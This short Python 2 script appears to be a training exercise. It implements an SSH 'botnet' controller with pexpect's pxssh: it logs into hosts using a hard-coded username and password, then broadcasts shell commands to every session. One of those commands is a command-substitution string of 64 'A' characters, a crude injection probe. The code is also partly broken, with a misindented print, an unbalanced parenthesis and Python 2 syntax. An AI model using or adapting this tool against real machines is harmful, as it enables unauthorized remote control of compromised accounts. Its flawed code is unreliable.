from pexpect import pxssh
import optparse


botnet = []
class Clinet:
	def __init__(self, host, user, password):
		self.host = host
		self.user = user
		self.password = password
		self.sessions = self.connect()
	def connect(self):
		try:
			s = pxssh.pxssh()
			s.login(self.host, self.user, self.password)
			return s
		except Exception as e:
			print e

	def send_command(self, cmd):
		self.sessions.sendline(cmd)
		self.sessions.prompt()
		return self.sessions.before

def botnetCommand(cmd):
	for client in botnet:
		output = client.send_command(cmd)
		print ('output from ' + client.host)
        print(output)
def addClient(host, user, password):
	client = Clinet(host,user, password)
	botnet.append(client)

addClient('127.0.0.1', 'osboxes', 'Omar12345')
addClient('127.0.0.1', 'osboxes', 'Omar12345')
addClient('127.0.0.1', 'osboxes', 'Omar12345')

botnetCommand('ls -l')
botnetCommand("$(python -c 'print \"A\"*64'")

